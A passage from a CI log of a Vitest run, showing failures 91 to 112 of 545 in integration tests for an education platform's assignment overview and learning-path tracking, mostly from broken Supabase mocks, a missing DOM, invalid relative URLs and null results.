2025-11-18T17:36:11.1875920Z     [90m298| [39m  supabase.from.mockImplementation(mockFrom);
2025-11-18T17:36:11.1877577Z     [90m   | [39m                [31m^[39m
2025-11-18T17:36:11.1900726Z     [90m299| [39m}
2025-11-18T17:36:11.1901188Z     [90m300| [39m
2025-11-18T17:36:11.1902082Z [90m [2m❯[22m __tests__/integration/assignmentOverview.test.js:[2m29:7[22m[39m
2025-11-18T17:36:11.1902607Z 
2025-11-18T17:36:11.1903039Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[91/545]⎯[22m[39m
2025-11-18T17:36:11.1903357Z 
2025-11-18T17:36:11.1905555Z [31m[1m[7m FAIL [27m[22m[39m __tests__/integration/assignmentOverview.test.js[2m > [22mAssignment Overview Integration Tests[2m > [22mEnd-to-end assignment overview flow[2m > [22mshould filter assignments by school correctly
2025-11-18T17:36:11.1907753Z [31m[1mTypeError[22m: supabase.from.mockImplementation is not a function[39m
2025-11-18T17:36:11.1909345Z [36m [2m❯[22m setupMocksForAdminWithSchoolFilter __tests__/integration/assignmentOverview.test.js:[2m359:17[22m[39m
2025-11-18T17:36:11.1910331Z     [90m357| [39m  });
2025-11-18T17:36:11.1910731Z     [90m358| [39m
2025-11-18T17:36:11.1911324Z     [90m359| [39m  supabase.from.mockImplementation(mockFrom);
2025-11-18T17:36:11.1912104Z     [90m   | [39m                [31m^[39m
2025-11-18T17:36:11.1912564Z     [90m360| [39m}
2025-11-18T17:36:11.1912944Z     [90m361| [39m
2025-11-18T17:36:11.1913768Z [90m [2m❯[22m __tests__/integration/assignmentOverview.test.js:[2m45:7[22m[39m
2025-11-18T17:36:11.1914289Z 
2025-11-18T17:36:11.1914681Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[92/545]⎯[22m[39m
2025-11-18T17:36:11.1914983Z 
2025-11-18T17:36:11.1917083Z [31m[1m[7m FAIL [27m[22m[39m __tests__/integration/assignmentOverview.test.js[2m > [22mAssignment Overview Integration Tests[2m > [22mEnd-to-end assignment overview flow[2m > [22mshould show consultant-specific assignments
2025-11-18T17:36:11.1918925Z [31m[1mTypeError[22m: supabase.from.mockImplementation is not a function[39m
2025-11-18T17:36:11.1920305Z [36m [2m❯[22m setupMocksForConsultant __tests__/integration/assignmentOverview.test.js:[2m412:17[22m[39m
2025-11-18T17:36:11.1921132Z     [90m410| [39m  });
2025-11-18T17:36:11.1921500Z     [90m411| [39m
2025-11-18T17:36:11.1922111Z     [90m412| [39m  supabase.from.mockImplementation(mockFrom);
2025-11-18T17:36:11.1922747Z     [90m   | [39m                [31m^[39m
2025-11-18T17:36:11.1923197Z     [90m413| [39m}
2025-11-18T17:36:11.1923538Z     [90m414| [39m
2025-11-18T17:36:11.1924340Z [90m [2m❯[22m __tests__/integration/assignmentOverview.test.js:[2m57:7[22m[39m
2025-11-18T17:36:11.1924811Z 
2025-11-18T17:36:11.1925198Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[93/545]⎯[22m[39m
2025-11-18T17:36:11.1925510Z 
2025-11-18T17:36:11.1927499Z [31m[1m[7m FAIL [27m[22m[39m __tests__/integration/assignmentOverview.test.js[2m > [22mAssignment Overview Integration Tests[2m > [22mEnd-to-end assignment overview flow[2m > [22mshould handle pagination correctly with filters
2025-11-18T17:36:11.1929388Z [31m[1mTypeError[22m: supabase.from.mockImplementation is not a function[39m
2025-11-18T17:36:11.1930774Z [36m [2m❯[22m setupMocksForPagination __tests__/integration/assignmentOverview.test.js:[2m472:17[22m[39m
2025-11-18T17:36:11.1931888Z     [90m470| [39m  });
2025-11-18T17:36:11.1932245Z     [90m471| [39m
2025-11-18T17:36:11.1932842Z     [90m472| [39m  supabase.from.mockImplementation(mockFrom);
2025-11-18T17:36:11.1933497Z     [90m   | [39m                [31m^[39m
2025-11-18T17:36:11.1934212Z     [90m473| [39m}
2025-11-18T17:36:11.1934558Z     [90m474| [39m
2025-11-18T17:36:11.1935391Z [90m [2m❯[22m __tests__/integration/assignmentOverview.test.js:[2m66:7[22m[39m
2025-11-18T17:36:11.1935903Z 
2025-11-18T17:36:11.1936302Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[94/545]⎯[22m[39m
2025-11-18T17:36:11.1936621Z 
2025-11-18T17:36:11.1939497Z [31m[1m[7m FAIL [27m[22m[39m __tests__/integration/assignmentOverview.test.js[2m > [22mAssignment Overview Integration Tests[2m > [22mEnd-to-end assignment overview flow[2m > [22mshould calculate submission statistics correctly
2025-11-18T17:36:11.1941558Z [31m[1mTypeError[22m: supabase.from.mockImplementation is not a function[39m
2025-11-18T17:36:11.1943024Z [36m [2m❯[22m setupMocksForAdmin __tests__/integration/assignmentOverview.test.js:[2m298:17[22m[39m
2025-11-18T17:36:11.1943908Z     [90m296| [39m  });
2025-11-18T17:36:11.1944323Z     [90m297| [39m
2025-11-18T17:36:11.1944956Z     [90m298| [39m  supabase.from.mockImplementation(mockFrom);
2025-11-18T17:36:11.1945676Z     [90m   | [39m                [31m^[39m
2025-11-18T17:36:11.1946179Z     [90m299| [39m}
2025-11-18T17:36:11.1947047Z     [90m300| [39m
2025-11-18T17:36:11.1948249Z [90m [2m❯[22m setupMocksWithSubmissions __tests__/integration/assignmentOverview.test.js:[2m485:3[22m[39m
2025-11-18T17:36:11.1949661Z [90m [2m❯[22m __tests__/integration/assignmentOverview.test.js:[2m102:7[22m[39m
2025-11-18T17:36:11.1950191Z 
2025-11-18T17:36:11.1950606Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[95/545]⎯[22m[39m
2025-11-18T17:36:11.1950922Z 
2025-11-18T17:36:11.1952878Z [31m[1m[7m FAIL [27m[22m[39m __tests__/integration/assignmentOverview.test.js[2m > [22mAssignment Overview Integration Tests[2m > [22mFilter interdependencies[2m > [22mshould show only communities belonging to selected school
2025-11-18T17:36:11.1954897Z [31m[1mTypeError[22m: supabase.from.mockImplementation is not a function[39m
2025-11-18T17:36:11.1956511Z [36m [2m❯[22m setupMocksForAdminWithSchoolFilter __tests__/integration/assignmentOverview.test.js:[2m359:17[22m[39m
2025-11-18T17:36:11.1957866Z     [90m357| [39m  });
2025-11-18T17:36:11.1958307Z     [90m358| [39m
2025-11-18T17:36:11.1958965Z     [90m359| [39m  supabase.from.mockImplementation(mockFrom);
2025-11-18T17:36:11.1959714Z     [90m   | [39m                [31m^[39m
2025-11-18T17:36:11.1960192Z     [90m360| [39m}
2025-11-18T17:36:11.1960566Z     [90m361| [39m
2025-11-18T17:36:11.1961802Z [90m [2m❯[22m setupMocksForFilterDependencies __tests__/integration/assignmentOverview.test.js:[2m489:3[22m[39m
2025-11-18T17:36:11.1963211Z [90m [2m❯[22m __tests__/integration/assignmentOverview.test.js:[2m116:7[22m[39m
2025-11-18T17:36:11.1963761Z 
2025-11-18T17:36:11.1964205Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[96/545]⎯[22m[39m
2025-11-18T17:36:11.1964539Z 
2025-11-18T17:36:11.1966420Z [31m[1m[7m FAIL [27m[22m[39m __tests__/integration/assignmentOverview.test.js[2m > [22mAssignment Overview Integration Tests[2m > [22mFilter interdependencies[2m > [22mshould clear generation filter when school changes
2025-11-18T17:36:11.1968637Z [31m[1mTypeError[22m: supabase.from.mockImplementation is not a function[39m
2025-11-18T17:36:11.1970076Z [36m [2m❯[22m setupMocksForAdmin __tests__/integration/assignmentOverview.test.js:[2m298:17[22m[39m
2025-11-18T17:36:11.1970953Z     [90m296| [39m  });
2025-11-18T17:36:11.1971392Z     [90m297| [39m
2025-11-18T17:36:11.1972006Z     [90m298| [39m  supabase.from.mockImplementation(mockFrom);
2025-11-18T17:36:11.1972670Z     [90m   | [39m                [31m^[39m
2025-11-18T17:36:11.1973141Z     [90m299| [39m}
2025-11-18T17:36:11.1973498Z     [90m300| [39m
2025-11-18T17:36:11.1974648Z [90m [2m❯[22m __tests__/integration/assignmentOverview.test.js:[2m131:7[22m[39m
2025-11-18T17:36:11.1975202Z 
2025-11-18T17:36:11.1975642Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[97/545]⎯[22m[39m
2025-11-18T17:36:11.1975977Z 
2025-11-18T17:36:11.1978411Z [31m[1m[7m FAIL [27m[22m[39m __tests__/integration/learning-path-tracking-accuracy.test.ts[2m > [22mLearning Path Tracking Accuracy - Integration Tests[2m > [22mSession Tracking Accuracy[2m > [22mshould accurately track session duration with heartbeats
2025-11-18T17:36:11.1980410Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.1981490Z [36m [2m❯[22m lib/services/learningPathSessionTracker.ts:[2m209:29[22m[39m
2025-11-18T17:36:11.1982463Z     [90m207| [39m    activityEvents.forEach(event => {
2025-11-18T17:36:11.1983349Z     [90m208| [39m      const handler = this.throttle(() => this.markActivity(), 1000);
2025-11-18T17:36:11.1984297Z     [90m209| [39m      this.addEventListener(document, event, handler);
2025-11-18T17:36:11.1985121Z     [90m   | [39m                            [31m^[39m
2025-11-18T17:36:11.1985626Z     [90m210| [39m    });
2025-11-18T17:36:11.1986026Z     [90m211| [39m  }
2025-11-18T17:36:11.1987617Z [90m [2m❯[22m LearningPathSessionTracker.setupEventListeners lib/services/learningPathSessionTracker.ts:[2m207:20[22m[39m
2025-11-18T17:36:11.1989721Z [90m [2m❯[22m new LearningPathSessionTracker lib/services/learningPathSessionTracker.ts:[2m42:10[22m[39m
2025-11-18T17:36:11.1991364Z [90m [2m❯[22m __tests__/integration/learning-path-tracking-accuracy.test.ts:[2m64:23[22m[39m
2025-11-18T17:36:11.1992009Z 
2025-11-18T17:36:11.1992457Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[98/545]⎯[22m[39m
2025-11-18T17:36:11.1992814Z 
2025-11-18T17:36:11.1995014Z [31m[1m[7m FAIL [27m[22m[39m __tests__/integration/learning-path-tracking-accuracy.test.ts[2m > [22mLearning Path Tracking Accuracy - Integration Tests[2m > [22mSession Tracking Accuracy[2m > [22mshould track multiple activities and aggregate time correctly
2025-11-18T17:36:11.1997284Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.1998406Z [36m [2m❯[22m lib/services/learningPathSessionTracker.ts:[2m209:29[22m[39m
2025-11-18T17:36:11.1999300Z     [90m207| [39m    activityEvents.forEach(event => {
2025-11-18T17:36:11.2000278Z     [90m208| [39m      const handler = this.throttle(() => this.markActivity(), 1000);
2025-11-18T17:36:11.2001245Z     [90m209| [39m      this.addEventListener(document, event, handler);
2025-11-18T17:36:11.2001990Z     [90m   | [39m                            [31m^[39m
2025-11-18T17:36:11.2002520Z     [90m210| [39m    });
2025-11-18T17:36:11.2002937Z     [90m211| [39m  }
2025-11-18T17:36:11.2004286Z [90m [2m❯[22m LearningPathSessionTracker.setupEventListeners lib/services/learningPathSessionTracker.ts:[2m207:20[22m[39m
2025-11-18T17:36:11.2006125Z [90m [2m❯[22m new LearningPathSessionTracker lib/services/learningPathSessionTracker.ts:[2m42:10[22m[39m
2025-11-18T17:36:11.2008194Z [90m [2m❯[22m __tests__/integration/learning-path-tracking-accuracy.test.ts:[2m113:25[22m[39m
2025-11-18T17:36:11.2008846Z 
2025-11-18T17:36:11.2009296Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[99/545]⎯[22m[39m
2025-11-18T17:36:11.2009620Z 
2025-11-18T17:36:11.2011900Z [31m[1m[7m FAIL [27m[22m[39m __tests__/integration/learning-path-tracking-accuracy.test.ts[2m > [22mLearning Path Tracking Accuracy - Integration Tests[2m > [22mSession Tracking Accuracy[2m > [22mshould handle session cleanup for abandoned sessions
2025-11-18T17:36:11.2014182Z [31m[1mTypeError[22m: Failed to parse URL from /api/cron/cleanup-learning-path-sessions[39m
2025-11-18T17:36:11.2015249Z [31m[1mCaused by: TypeError[22m: Invalid URL[39m
2025-11-18T17:36:11.2016501Z [36m [2m❯[22m __tests__/integration/learning-path-tracking-accuracy.test.ts:[2m162:30[22m[39m
2025-11-18T17:36:11.2017341Z 
2025-11-18T17:36:11.2017762Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[22m[39m
2025-11-18T17:36:11.2019069Z [31m[1mSerialized Error:[22m[39m [90m{ input: '/api/cron/cleanup-learning-path-sessions', code: 'ERR_INVALID_URL' }[39m
2025-11-18T17:36:11.2020193Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[100/545]⎯[22m[39m
2025-11-18T17:36:11.2020511Z 
2025-11-18T17:36:11.2023013Z [31m[1m[7m FAIL [27m[22m[39m __tests__/integration/learning-path-tracking-accuracy.test.ts[2m > [22mLearning Path Tracking Accuracy - Integration Tests[2m > [22mProgress Calculation Accuracy[2m > [22mshould accurately calculate learning path progress from session data
2025-11-18T17:36:11.2025137Z [31m[1mAssertionError[22m: expected { …(4) } to be null[39m
2025-11-18T17:36:11.2026377Z [36m [2m❯[22m __tests__/integration/learning-path-tracking-accuracy.test.ts:[2m214:21[22m[39m
2025-11-18T17:36:11.2027445Z     [90m212| [39m        });
2025-11-18T17:36:11.2027883Z     [90m213| [39m
2025-11-18T17:36:11.2028403Z     [90m214| [39m      expect(error).toBeNull();
2025-11-18T17:36:11.2029069Z     [90m   | [39m                    [31m^[39m
2025-11-18T17:36:11.2029763Z     [90m215| [39m      expect(pathDetails).toBeDefined();
2025-11-18T17:36:11.2030324Z     [90m216| [39m
2025-11-18T17:36:11.2030519Z 
2025-11-18T17:36:11.2030918Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[101/545]⎯[22m[39m
2025-11-18T17:36:11.2031242Z 
2025-11-18T17:36:11.2033377Z [31m[1m[7m FAIL [27m[22m[39m __tests__/integration/learning-path-tracking-accuracy.test.ts[2m > [22mLearning Path Tracking Accuracy - Integration Tests[2m > [22mProgress Calculation Accuracy[2m > [22mshould handle 100% course completion correctly
2025-11-18T17:36:11.2035449Z [31m[1mTypeError[22m: Cannot read properties of null (reading 'progress')[39m
2025-11-18T17:36:11.2036933Z [36m [2m❯[22m __tests__/integration/learning-path-tracking-accuracy.test.ts:[2m255:26[22m[39m
2025-11-18T17:36:11.2037826Z     [90m253| [39m
2025-11-18T17:36:11.2038480Z     [90m254| [39m      // Validate 100% completion is detected
2025-11-18T17:36:11.2039369Z     [90m255| [39m      expect(pathDetails.progress.completed_courses).toBe(1);
2025-11-18T17:36:11.2040188Z     [90m   | [39m                         [31m^[39m
2025-11-18T17:36:11.2041095Z     [90m256| [39m      expect(pathDetails.progress.progress_percentage).toBe(100);
2025-11-18T17:36:11.2042345Z     [90m257| [39m
2025-11-18T17:36:11.2042585Z 
2025-11-18T17:36:11.2043041Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[102/545]⎯[22m[39m
2025-11-18T17:36:11.2043395Z 
2025-11-18T17:36:11.2045672Z [31m[1m[7m FAIL [27m[22m[39m __tests__/integration/learning-path-tracking-accuracy.test.ts[2m > [22mLearning Path Tracking Accuracy - Integration Tests[2m > [22mAnalytics Reporting Accuracy[2m > [22mshould provide accurate analytics data from tracking sessions
2025-11-18T17:36:11.2048478Z [31m[1mTypeError[22m: Failed to parse URL from /api/learning-paths/analytics?pathId=test-path-1763487330869&dateRange=30[39m
2025-11-18T17:36:11.2049748Z [31m[1mCaused by: TypeError[22m: Invalid URL[39m
2025-11-18T17:36:11.2051226Z [36m [2m❯[22m __tests__/integration/learning-path-tracking-accuracy.test.ts:[2m293:39[22m[39m
2025-11-18T17:36:11.2051904Z 
2025-11-18T17:36:11.2052364Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[22m[39m
2025-11-18T17:36:11.2054047Z [31m[1mSerialized Error:[22m[39m [90m{ input: '/api/learning-paths/analytics?pathId=test-path-1763487330869&dateRange=30', code: 'ERR_INVALID_URL' }[39m
2025-11-18T17:36:11.2055493Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[103/545]⎯[22m[39m
2025-11-18T17:36:11.2055840Z 
2025-11-18T17:36:11.2058307Z [31m[1m[7m FAIL [27m[22m[39m __tests__/integration/learning-path-tracking-accuracy.test.ts[2m > [22mLearning Path Tracking Accuracy - Integration Tests[2m > [22mData Consistency Validation[2m > [22mshould maintain data consistency across all tracking tables
2025-11-18T17:36:11.2060558Z [31m[1mTypeError[22m: Cannot read properties of null (reading 'reduce')[39m
2025-11-18T17:36:11.2061978Z [36m [2m❯[22m __tests__/integration/learning-path-tracking-accuracy.test.ts:[2m354:36[22m[39m
2025-11-18T17:36:11.2062972Z     [90m352| [39m        .single();
2025-11-18T17:36:11.2063477Z     [90m353| [39m
2025-11-18T17:36:11.2064302Z     [90m354| [39m      const sessionTime = sessions.reduce((sum: number, s: any) => sum…
2025-11-18T17:36:11.2065225Z     [90m   | [39m                                   [31m^[39m
2025-11-18T17:36:11.2067087Z     [90m355| [39m      expect(assignment.total_time_spent_minutes).toBe(sessionTime);
2025-11-18T17:36:11.2068198Z     [90m356| [39m
2025-11-18T17:36:11.2068433Z 
2025-11-18T17:36:11.2068889Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[104/545]⎯[22m[39m
2025-11-18T17:36:11.2069219Z 
2025-11-18T17:36:11.2071594Z [31m[1m[7m FAIL [27m[22m[39m __tests__/integration/learning-path-tracking-validation.test.ts[2m > [22mLearning Path Tracking System Validation[2m > [22mProgress Calculation Accuracy[2m > [22mshould correctly calculate progress percentages for different completion scenarios
2025-11-18T17:36:11.2074403Z [31m[1mError[22m: Failed to fetch learning path details: supabaseClient.from(...).select(...).eq(...).eq(...).not is not a function[39m
2025-11-18T17:36:11.2076256Z [36m [2m❯[22m Function.getLearningPathDetailsForUser lib/services/learningPathsService.ts:[2m813:13[22m[39m
2025-11-18T17:36:11.2078111Z     [90m811| [39m    } catch (error: any) {
2025-11-18T17:36:11.2079008Z     [90m812| [39m      console.error('[LearningPathsService] Error in getLearningPathDe…
2025-11-18T17:36:11.2080066Z     [90m813| [39m      throw new Error(`Failed to fetch learning path details: ${error.…
2025-11-18T17:36:11.2080806Z     [90m   | [39m            [31m^[39m
2025-11-18T17:36:11.2081266Z     [90m814| [39m    }
2025-11-18T17:36:11.2081650Z     [90m815| [39m  }
2025-11-18T17:36:11.2082688Z [90m [2m❯[22m __tests__/integration/learning-path-tracking-validation.test.ts:[2m62:49[22m[39m
2025-11-18T17:36:11.2083328Z 
2025-11-18T17:36:11.2083723Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[105/545]⎯[22m[39m
2025-11-18T17:36:11.2084059Z 
2025-11-18T17:36:11.2086043Z [31m[1m[7m FAIL [27m[22m[39m __tests__/integration/learning-path-tracking-validation.test.ts[2m > [22mLearning Path Tracking System Validation[2m > [22mProgress Calculation Accuracy[2m > [22mshould handle 100% completion correctly
2025-11-18T17:36:11.2088709Z [31m[1mError[22m: Failed to fetch learning path details: supabaseClient.from(...).select(...).eq(...).eq(...).not is not a function[39m
2025-11-18T17:36:11.2090429Z [36m [2m❯[22m Function.getLearningPathDetailsForUser lib/services/learningPathsService.ts:[2m813:13[22m[39m
2025-11-18T17:36:11.2091439Z     [90m811| [39m    } catch (error: any) {
2025-11-18T17:36:11.2092304Z     [90m812| [39m      console.error('[LearningPathsService] Error in getLearningPathDe…
2025-11-18T17:36:11.2093349Z     [90m813| [39m      throw new Error(`Failed to fetch learning path details: ${error.…
2025-11-18T17:36:11.2094071Z     [90m   | [39m            [31m^[39m
2025-11-18T17:36:11.2094534Z     [90m814| [39m    }
2025-11-18T17:36:11.2095166Z     [90m815| [39m  }
2025-11-18T17:36:11.2096207Z [90m [2m❯[22m __tests__/integration/learning-path-tracking-validation.test.ts:[2m102:49[22m[39m
2025-11-18T17:36:11.2097046Z 
2025-11-18T17:36:11.2097471Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[106/545]⎯[22m[39m
2025-11-18T17:36:11.2097806Z 
2025-11-18T17:36:11.2099869Z [31m[1m[7m FAIL [27m[22m[39m __tests__/integration/learning-path-tracking-validation.test.ts[2m > [22mLearning Path Tracking System Validation[2m > [22mProgress Calculation Accuracy[2m > [22mshould handle zero progress correctly
2025-11-18T17:36:11.2102408Z [31m[1mError[22m: Failed to fetch learning path details: supabaseClient.from(...).select(...).eq(...).eq(...).not is not a function[39m
2025-11-18T17:36:11.2104272Z [36m [2m❯[22m Function.getLearningPathDetailsForUser lib/services/learningPathsService.ts:[2m813:13[22m[39m
2025-11-18T17:36:11.2105357Z     [90m811| [39m    } catch (error: any) {
2025-11-18T17:36:11.2106289Z     [90m812| [39m      console.error('[LearningPathsService] Error in getLearningPathDe…
2025-11-18T17:36:11.2107633Z     [90m813| [39m      throw new Error(`Failed to fetch learning path details: ${error.…
2025-11-18T17:36:11.2108434Z     [90m   | [39m            [31m^[39m
2025-11-18T17:36:11.2108953Z     [90m814| [39m    }
2025-11-18T17:36:11.2109409Z     [90m815| [39m  }
2025-11-18T17:36:11.2110653Z [90m [2m❯[22m __tests__/integration/learning-path-tracking-validation.test.ts:[2m136:49[22m[39m
2025-11-18T17:36:11.2111337Z 
2025-11-18T17:36:11.2111783Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[107/545]⎯[22m[39m
2025-11-18T17:36:11.2112196Z 
2025-11-18T17:36:11.2114504Z [31m[1m[7m FAIL [27m[22m[39m __tests__/integration/learning-path-tracking-validation.test.ts[2m > [22mLearning Path Tracking System Validation[2m > [22mButton Text and Variants Validation[2m > [22mshould assign correct button text and variants based on course status
2025-11-18T17:36:11.2137493Z [31m[1mError[22m: Failed to fetch learning path details: supabaseClient.from(...).select(...).eq(...).eq(...).not is not a function[39m
2025-11-18T17:36:11.2139438Z [36m [2m❯[22m Function.getLearningPathDetailsForUser lib/services/learningPathsService.ts:[2m813:13[22m[39m
2025-11-18T17:36:11.2140574Z     [90m811| [39m    } catch (error: any) {
2025-11-18T17:36:11.2141483Z     [90m812| [39m      console.error('[LearningPathsService] Error in getLearningPathDe…
2025-11-18T17:36:11.2142633Z     [90m813| [39m      throw new Error(`Failed to fetch learning path details: ${error.…
2025-11-18T17:36:11.2143409Z     [90m   | [39m            [31m^[39m
2025-11-18T17:36:11.2143921Z     [90m814| [39m    }
2025-11-18T17:36:11.2144367Z     [90m815| [39m  }
2025-11-18T17:36:11.2145460Z [90m [2m❯[22m __tests__/integration/learning-path-tracking-validation.test.ts:[2m186:49[22m[39m
2025-11-18T17:36:11.2146092Z 
2025-11-18T17:36:11.2146490Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[108/545]⎯[22m[39m
2025-11-18T17:36:11.2147029Z 
2025-11-18T17:36:11.2149164Z [31m[1m[7m FAIL [27m[22m[39m __tests__/integration/learning-path-tracking-validation.test.ts[2m > [22mLearning Path Tracking System Validation[2m > [22mTime Tracking Calculations[2m > [22mshould aggregate time correctly from multiple sources
2025-11-18T17:36:11.2158297Z [31m[1mError[22m: Failed to fetch learning path details: supabaseClient.from(...).select(...).eq(...).eq(...).not is not a function[39m
2025-11-18T17:36:11.2160051Z [36m [2m❯[22m Function.getLearningPathDetailsForUser lib/services/learningPathsService.ts:[2m813:13[22m[39m
2025-11-18T17:36:11.2161058Z     [90m811| [39m    } catch (error: any) {
2025-11-18T17:36:11.2161899Z     [90m812| [39m      console.error('[LearningPathsService] Error in getLearningPathDe…
2025-11-18T17:36:11.2162899Z     [90m813| [39m      throw new Error(`Failed to fetch learning path details: ${error.…
2025-11-18T17:36:11.2163587Z     [90m   | [39m            [31m^[39m
2025-11-18T17:36:11.2164017Z     [90m814| [39m    }
2025-11-18T17:36:11.2164652Z     [90m815| [39m  }
2025-11-18T17:36:11.2199949Z [90m [2m❯[22m __tests__/integration/learning-path-tracking-validation.test.ts:[2m228:49[22m[39m
2025-11-18T17:36:11.2200603Z 
2025-11-18T17:36:11.2201011Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[109/545]⎯[22m[39m
2025-11-18T17:36:11.2201329Z 
2025-11-18T17:36:11.2203314Z [31m[1m[7m FAIL [27m[22m[39m __tests__/integration/learning-path-tracking-validation.test.ts[2m > [22mLearning Path Tracking System Validation[2m > [22mTime Tracking Calculations[2m > [22mshould handle completed path time tracking
2025-11-18T17:36:11.2205779Z [31m[1mError[22m: Failed to fetch learning path details: supabaseClient.from(...).select(...).eq(...).eq(...).not is not a function[39m
2025-11-18T17:36:11.2227931Z [36m [2m❯[22m Function.getLearningPathDetailsForUser lib/services/learningPathsService.ts:[2m813:13[22m[39m
2025-11-18T17:36:11.2229010Z     [90m811| [39m    } catch (error: any) {
2025-11-18T17:36:11.2229872Z     [90m812| [39m      console.error('[LearningPathsService] Error in getLearningPathDe…
2025-11-18T17:36:11.2230958Z     [90m813| [39m      throw new Error(`Failed to fetch learning path details: ${error.…
2025-11-18T17:36:11.2231686Z     [90m   | [39m            [31m^[39m
2025-11-18T17:36:11.2232138Z     [90m814| [39m    }
2025-11-18T17:36:11.2232513Z     [90m815| [39m  }
2025-11-18T17:36:11.2233754Z [90m [2m❯[22m __tests__/integration/learning-path-tracking-validation.test.ts:[2m262:49[22m[39m
2025-11-18T17:36:11.2234387Z 
2025-11-18T17:36:11.2234777Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[110/545]⎯[22m[39m
2025-11-18T17:36:11.2235100Z 
2025-11-18T17:36:11.2237437Z [31m[1m[7m FAIL [27m[22m[39m __tests__/integration/learning-path-tracking-validation.test.ts[2m > [22mLearning Path Tracking System Validation[2m > [22mData Structure Validation[2m > [22mshould maintain consistent data structure across all scenarios
2025-11-18T17:36:11.2240005Z [31m[1mError[22m: Failed to fetch learning path details: supabaseClient.from(...).select(...).eq(...).eq(...).not is not a function[39m
2025-11-18T17:36:11.2241747Z [36m [2m❯[22m Function.getLearningPathDetailsForUser lib/services/learningPathsService.ts:[2m813:13[22m[39m
2025-11-18T17:36:11.2242769Z     [90m811| [39m    } catch (error: any) {
2025-11-18T17:36:11.2243652Z     [90m812| [39m      console.error('[LearningPathsService] Error in getLearningPathDe…
2025-11-18T17:36:11.2244730Z     [90m813| [39m      throw new Error(`Failed to fetch learning path details: ${error.…
2025-11-18T17:36:11.2245478Z     [90m   | [39m            [31m^[39m
2025-11-18T17:36:11.2245944Z     [90m814| [39m    }
2025-11-18T17:36:11.2246324Z     [90m815| [39m  }
2025-11-18T17:36:11.2267693Z [90m [2m❯[22m __tests__/integration/learning-path-tracking-validation.test.ts:[2m295:51[22m[39m
2025-11-18T17:36:11.2268376Z 
2025-11-18T17:36:11.2268836Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[111/545]⎯[22m[39m
2025-11-18T17:36:11.2269159Z 
2025-11-18T17:36:11.2271138Z [31m[1m[7m FAIL [27m[22m[39m __tests__/integration/learning-path-tracking-validation.test.ts[2m > [22mLearning Path Tracking System Validation[2m > [22mError Handling Validation[2m > [22mshould handle database errors gracefully
2025-11-18T17:36:11.2273883Z [31m[1mAssertionError[22m: expected [Function] to throw error including 'Failed to fetch learning path details…' but got 'Failed to fetch learning path details…'[39m
2025-11-18T17:36:11.2274901Z 
2025-11-18T17:36:11.2275040Z - Expected
2025-11-18T17:36:11.2275328Z + Received
2025-11-18T17:36:11.2275497Z 
2025-11-18T17:36:11.2275916Z - Failed to fetch learning path details: Database connection failed
2025-11-18T17:36:11.2277305Z + Failed to fetch learning path details: supabaseClient.from(...).select(...).eq(...).eq(...).not is not a function
2025-11-18T17:36:11.2278006Z 
2025-11-18T17:36:11.2278431Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[112/545]⎯[22m[39m
2025-11-18T17:36:11.2278755Z 
2025-11-18T17:36:11.2280666Z [31m[1m[7m FAIL [27m[22m[39m __tests__/integration/learning-path-tracking-validation.test.ts[2m > [22mLearning Path Tracking System Validation[2m > [22mError Handling Validation[2m > [22mshould handle missing path gracefully
